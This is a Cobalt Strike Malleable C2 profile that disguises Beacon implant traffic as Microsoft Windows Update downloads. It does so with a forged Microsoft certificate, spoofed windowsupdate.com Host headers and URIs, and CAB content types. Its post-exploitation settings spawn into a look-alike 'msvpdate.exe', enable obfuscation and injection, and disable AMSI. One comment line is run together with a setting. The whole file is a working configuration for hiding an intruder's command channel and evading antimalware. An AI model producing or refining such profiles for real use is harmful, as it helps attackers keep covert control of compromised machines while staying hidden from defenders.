# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# Microsoft Update
# 
# Author: @bluscreenofjeff
#

#set https cert info
#information assumed based on other Microsoft certs
https-certificate {
    set CN       "www.windowsupdate.com"; #Common Name
    set O        "Microsoft Corporation"; #Organization Name
    set C        "US"; #Country
    set L        "Redmond"; #Locality
    set OU       "Microsoft IT"; #Organizational Unit Name
    set ST       "WA"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "7300";
set jitter    "13";

set host_stage "true";

#default useragent for HTTP comms
set useragent "Windows-Update-Agent/10.0.06160.79627 Client-Protocol/1.40";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "246";

http-get {

    set uri "/c/msdownload/update/others/2021/04/3883707_";

    client {

        header "Accept" "*/*";
        header "Host" "download.windowsupdate.com";
        
        #session metadata
        metadata {
            base64url;
            append ".cab";
            uri-append;
        }
    }


    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #Beacon's tasksset host_stage "true";
        output {

            print;
        }
    }
}

http-post {
    
    set uri "/c/msdownload/update/others/2021/04/6642982_";
    set verb "GET";

    client {

        header "Accept" "*/*";

        #session ID
        id {
            prepend "download.windowsupdate.com/c/";
            header "Host";
        }


        #Beacon's responses
        output {
            base64url;
            append ".cab";
            uri-append;
        }
    }

    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #empty
        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
    }
}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\msvpdate.exe";
	set spawnto_x64 "%windir%\\sysnative\\msvpdate.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}
